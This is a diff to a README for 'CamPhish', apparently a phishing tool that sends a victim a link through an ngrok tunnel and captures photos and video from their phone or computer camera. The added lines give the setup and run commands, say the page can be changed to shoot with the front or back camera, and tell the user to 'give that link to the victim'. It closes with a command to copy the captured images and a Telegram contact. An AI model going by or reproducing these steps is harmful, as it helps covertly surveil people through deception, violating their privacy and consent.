@@ -30,3 +30,25 @@ Please install these prerequisites before running
 
 <img src="https://github.com/user-attachments/assets/957246ed-f465-4a08-bb98-30f9f07c5870">
 
+
+After installing ngrok, enter the site and register, get your token and enter the token with this command:
+`ngrok config add-authtoken <token>`
+
+Now run the program:
+
+```
+git clone https://github.com/Mr-Spect3r/CamPhish
+cd CamPhish
+python main.py
+```
+
+If you are running it for the first time, you must enter your ngrok token
+
+Now, if you like, you can change the index.html file, for example, take a few photos from the back or front camera or record a few seconds of video.
+
+Now, if you have done all the steps correctly, the program will give you a link, give that link to the victim so that you can take photos and videos from it!
+
+Photos are saved in the uploads folder! If you are in termux, use this command to transfer the photos to your gallery: cp /uploads/* /sdcard
+
+My Telegram: @MrEsfelurm
+Vip tools: https://github.com/Mr-Spect3r/My-Tools
